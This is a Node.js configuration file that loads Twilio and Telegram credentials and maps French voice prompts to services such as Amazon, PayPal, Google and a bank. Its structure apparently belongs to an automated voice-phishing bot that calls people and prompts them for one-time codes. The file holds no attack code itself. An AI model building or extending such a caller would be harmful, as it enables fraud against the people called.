/**
 * Loads configuration from environment variables and .env file.
 * - Audio file paths for each service.
 */
require('dotenv').config();

module.exports = {
    setupdone: process.env.SETUP_DONE || 'true',

    // Twilio account info
    accountSid: process.env.TWILIO_ACCOUNT_SID,
    authToken: process.env.TWILIO_AUTH_TOKEN,
    callerid: process.env.TWILIO_CALLER_ID,

    // API info
    apipassword: process.env.API_PASSWORD,
    serverurl: process.env.SERVER_URL,

    // Telegram bot info
    telegramChatId: process.env.TELEGRAM_CHAT_ID,
    telegramBotToken: process.env.TELEGRAM_BOT_TOKEN,

    // Express server port
    port: process.env.PORT || 1337,

    // Audio file paths for streaming
    amazonfilepath: process.env.AMAZON_FILE_PATH || './voice/fr/amazon/ask-amazon.mp3',
    cdiscountfilepath: process.env.CDISCOUNT_FILE_PATH || './voice/fr/cdiscount/ask-cdiscount.mp3',
    twitterfilepath: process.env.TWITTER_FILE_PATH || './voice/fr/twitter/ask-twitter.mp3',
    whatsappfilepath: process.env.WHATSAPP_FILE_PATH || './voice/fr/whatsapp/ask-whatsapp.mp3',
    paypalfilepath: process.env.PAYPAL_FILE_PATH || './voice/fr/paypal/ask-pp.mp3',
    googlefilepath: process.env.GOOGLE_FILE_PATH || './voice/fr/google/ask-google.mp3',
    snapchatfilepath: process.env.SNAPCHAT_FILE_PATH || './voice/fr/snapchat/ask-snapchat.mp3',
    instagramfilepath: process.env.INSTAGRAM_FILE_PATH || './voice/fr/instagram/ask-instagram.mp3',
    facebookfilepath: process.env.FACEBOOK_FILE_PATH || './voice/fr/facebook/ask-facebook.mp3',
    endfilepath: process.env.END_FILE_PATH || './voice/fr/done/call-done.mp3',
    defaultfilepath: process.env.DEFAULT_FILE_PATH || './voice/fr/default/ask-default.mp3',
    banquefilepath: process.env.BANQUE_FILE_PATH || './voice/fr/banque/ask-banque.mp3',

    // SMS content for services
    paypalsms: process.env.PAYPAL_SMS || 'pp test 123'
};
